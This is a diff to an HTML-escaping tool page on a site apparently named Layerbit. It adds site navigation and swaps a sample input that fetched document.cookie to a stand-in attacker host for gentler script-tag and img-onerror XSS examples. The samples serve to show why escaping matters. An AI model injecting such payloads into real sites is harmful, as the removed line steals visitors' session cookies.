@@ -283,6 +283,13 @@
       </svg>
       Layerbit
     </a>
+    <nav class="site-nav" aria-label="Main">
+      <a href="../#tools">Tools</a>
+      <a href="../blog.html">Guides</a>
+      <a href="../work.html">Apps</a>
+      <a href="../about.html">About</a>
+      <a href="../contact.html">Contact</a>
+    </nav>
   </header>
 
   <nav class="crumbs tool-crumbs" aria-label="Breadcrumb">
@@ -366,10 +373,10 @@
 
     <div class="info-panel">
       <h2><i data-lucide="test-tube"></i> Quick Testing Templates</h2>
-      <p>Test the sanitizer's regex capabilities. Click the templates below to load payloads directly into the workspace.</p>
+      <p>Load an example to see what escaping changes. The second one is the kind of untrusted input a comment box or form field might receive, and shows why it must be escaped before it is put into a page.</p>
       <div>
         <button class="sample-btn" data-lb-autosample onclick="loadSample('html')">Standard HTML Block</button>
-        <button class="sample-btn" onclick="loadSample('xss')">Malicious XSS Payload</button>
+        <button class="sample-btn" onclick="loadSample('xss')">Untrusted input (script tag)</button>
       </div>
     </div>
 
@@ -702,7 +709,7 @@
     function loadSample(type) {
       const samples = {
         html: "<div class=\"hero-banner\">\n  <h1>Welcome to the Dashboard</h1>\n  <p>Click <a href=\"/login\">here</a> to securely authenticate.</p>\n</div>",
-        xss: "<script>\n  alert('Malicious XSS Payload Executed!');\n  fetch('http://hacker-server.com?cookie=' + document.cookie);\n<\/script>"
+        xss: "<p>Great post!</p>\n<script>alert('This would run if the comment were not escaped');<\/script>\n<img src=\"missing.png\" onerror=\"alert('So would this')\">"
       };
       
       rawInput.value = samples[type];
